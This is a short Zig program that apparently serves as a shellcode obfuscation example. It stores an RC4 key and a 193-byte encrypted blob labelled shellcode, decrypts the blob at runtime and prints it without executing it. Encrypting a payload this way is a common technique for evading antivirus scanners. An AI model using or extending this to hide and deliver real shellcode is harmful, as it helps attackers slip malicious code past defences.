const std = @import("std");

const RC4_KEY: [16]u8 = [_]u8{
    0xfb, 0x94, 0xef, 0x7f, 0xa7, 0x66, 0x99, 0x17, 0x73, 0x96, 0xf4, 0x62, 0xc0, 0x5f, 0x9d, 0x97
};

const RC4_CIPHERTEXT: [193]u8 = [_]u8{
    0x97, 0x02, 0x7f, 0x00, 0x9c, 0x1c, 0xac, 0x98, 0x04, 0x9c, 0xcb, 0xd3, 0x01, 0x1b, 0xe2, 0x5c, 
    0xbb, 0x14, 0x56, 0xa8, 0x6f, 0x02, 0xff, 0xbf, 0x53, 0xac, 0x66, 0xa6, 0x41, 0x99, 0x90, 0x58, 
    0x8a, 0x09, 0x03, 0x6e, 0x1e, 0x1c, 0x38, 0x4c, 0xf2, 0x5e, 0xd0, 0x59, 0x7f, 0x62, 0x82, 0x48, 
    0x5e, 0xa4, 0x9e, 0xa5, 0x4e, 0x6a, 0x30, 0xd7, 0x8b, 0x32, 0xfb, 0xef, 0x72, 0x78, 0xb5, 0x9c, 
    0xc1, 0x85, 0xcb, 0x2f, 0xe2, 0x76, 0x50, 0x01, 0xc8, 0x69, 0x64, 0xe7, 0x68, 0xd7, 0x4e, 0x1d, 
    0xe2, 0x6e, 0x68, 0x0c, 0x2f, 0x20, 0x1e, 0xa0, 0x87, 0x5c, 0xb8, 0xc0, 0x84, 0xec, 0x44, 0x7a, 
    0x01, 0xee, 0x95, 0x23, 0x9b, 0x19, 0x02, 0xe6, 0x3f, 0x0d, 0xc9, 0x37, 0xa2, 0x85, 0xd8, 0xed, 
    0xd4, 0x73, 0xcd, 0x83, 0x27, 0x5e, 0xcb, 0xe8, 0x53, 0x2a, 0x4f, 0xd0, 0xe8, 0xae, 0x93, 0xc1, 
    0x25, 0xa9, 0x27, 0x3d, 0xac, 0x60, 0xcc, 0x8d, 0xc0, 0xbc, 0xfc, 0xb9, 0xf1, 0x7b, 0x27, 0x93, 
    0x3b, 0x3a, 0x1f, 0xeb, 0x19, 0x35, 0x1c, 0xcb, 0xbb, 0xce, 0x2d, 0x8d, 0x08, 0x22, 0x8c, 0x98, 
    0x37, 0xcb, 0x32, 0x6b, 0x75, 0xa9, 0x65, 0x71, 0xe6, 0x8f, 0x67, 0xf2, 0xca, 0x81, 0x9b, 0x58, 
    0x95, 0x3a, 0xfc, 0x99, 0xb5, 0x02, 0x22, 0x47, 0x99, 0xee, 0xe6, 0xcb, 0xa5, 0x09, 0x79, 0x19, 
    0x36
};

fn rc4Decryption(key: []const u8, data: []u8) void {
    // RC4 Key Scheduling Algorithm (KSA)
    var s: [256]u8 = undefined;
    for (0..256) |i| {
        s[i] = @as(u8, @intCast(i));
    }

    var j: u32 = 0;
    for (0..256) |i| {
        j = (j + s[i] + key[i % key.len]) % @as(u32, 256);
        const temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }

    // RC4 Pseudo-Random Generation Algorithm (PRGA)
    var i: u32 = 0;
    j = 0;
    for (data) |*byte| {
        i = (i + 1) % @as(u32, 256);
        j = (j + s[i]) % @as(u32, 256);
        const temp = s[i];
        s[i] = s[j];
        s[j] = temp;
        const k = (@as(u32, s[i]) + @as(u32, s[j])) % @as(u32, 256);
        const keystream_byte = s[k];
        byte.* ^= keystream_byte;
    }
}

pub fn main() !void {
    var ciphertext = RC4_CIPHERTEXT;
    rc4Decryption(&RC4_KEY, &ciphertext);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});
}
